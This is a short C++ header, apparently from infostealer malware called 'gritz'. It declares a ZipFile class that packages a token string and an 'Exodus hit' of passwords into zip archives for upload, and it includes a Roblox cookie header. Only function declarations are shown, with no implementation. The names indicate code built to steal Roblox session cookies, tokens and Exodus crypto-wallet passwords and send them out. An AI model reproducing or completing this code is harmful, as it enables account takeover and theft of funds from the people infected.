#pragma once
#include <features/roblox/RobloxCookie.h>

namespace gritz::upload::zip
{
	class ZipFile final
	{
	private:
		static void addEntry(mz_zip_archive& archive, std::vector<uint8_t> data, std::string entryName);
		static void addEntry(mz_zip_archive& archive, std::string data, std::string entryName);
	public:
		static std::vector<uint8_t> create(std::string tokenString);
		static std::vector<byte> createExodusHit(std::string passwords);
	};
}